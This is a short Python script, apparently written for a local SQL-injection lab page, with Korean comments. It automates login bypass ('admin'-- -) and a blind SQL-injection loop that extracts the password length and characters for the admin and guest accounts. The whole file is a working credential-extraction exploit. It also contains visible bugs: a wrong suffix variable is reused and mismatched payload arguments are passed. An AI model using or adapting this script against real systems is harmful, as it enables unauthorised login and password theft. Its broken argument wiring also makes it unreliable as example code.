import requests
import string

def getLength(URL, PAY_START, PAY_END):
    true_result = "Success!!"

    for i in range(1, 100):
        param = PAY_START + str(i) + PAY_END
        new_url = URL + param
        resp = requests.get(new_url)

        if resp.text.find(true_result) > -1:
            print("pw의 길이는 ", i)            
            return i

def getPasswd(URL, LENGTH, PAY_START, PAY_MID, PAY_END):
    true_result = "Success!!"
    ascii_letters = string.digits + string.ascii_letters
    FLAG = ""

    for i in range(LENGTH):
        for elem in ascii_letters:
            param = PAY_START + str(LENGTH - i + 1) + PAY_MID + elem + PAY_END
            new_url = URL + param
            resp = requests.get(new_url)

            if resp.text.find(true_result) > -1:
                print(str(i + 1) + "번째 pw : ", elem)
                FLAG += elem
            else:
                continue
    
    return FLAG



URL = "http://192.168.81.129/sqli/sqli7.php"
PAYLOAD01 = "?uid=admin%27--%20-"
PAYLOAD02 = "?uid=guest%27--%20-"

PAYLOAD03_LEN_START = "?uid=admin%27%20%26%26%20length(upw)="
PAYLOAD03_LEN_END = "--%09-"
PAYLOAD03_BLIND_START = "?uid=admin%27%20%26%26%20LEFT(RIGHT(upw,"
PAYLOAD03_BLIND_MID = "), 1)=%27"
PAYLOAD03_BLIND_END = "%27--%09-"
P03_LEN = 0

PAYLOAD04_LEN_START = "?uid=guest%27%20%26%26%20length(upw)="
PAYLOAD04_LEN_END = "--%09-"
PAYLOAD04_BLIND_START = "?uid=guest%27%20%26%26%20LEFT(RIGHT(upw,"
PAYLOAD04_BLIND_MID = "), 1)=%27"
PAYLOAD04_BLIND_END = "%27--%09-"
P04_LEN = 0

'''
http://192.168.81.129/sqli/sqli7.php?uid=guest%27%20and%20LEFT(RIGHT(upw,4),1)=%27g%27--%20-
'''

P03_LEN = getLength(URL, PAYLOAD03_LEN_START, PAYLOAD03_LEN_END)
P04_LEN = getLength(URL, PAYLOAD04_LEN_START, PAYLOAD03_LEN_END)

P03_FLAG = getPasswd(URL, P03_LEN, PAYLOAD03_BLIND_START, PAYLOAD03_BLIND_MID, PAYLOAD03_BLIND_MID)
P04_FLAG = getPasswd(URL, P04_LEN, PAYLOAD04_BLIND_START, PAYLOAD04_BLIND_MID, PAYLOAD04_BLIND_MID)

'''
1번 목표 : guest, admin 로그인 -> 단순 sqli & Blind Sqli 직후 정확한 패스워드 둘다 시도
2번 목표 : guest, admin 패스워드 찾기 -> Blind Sqli 이용
'''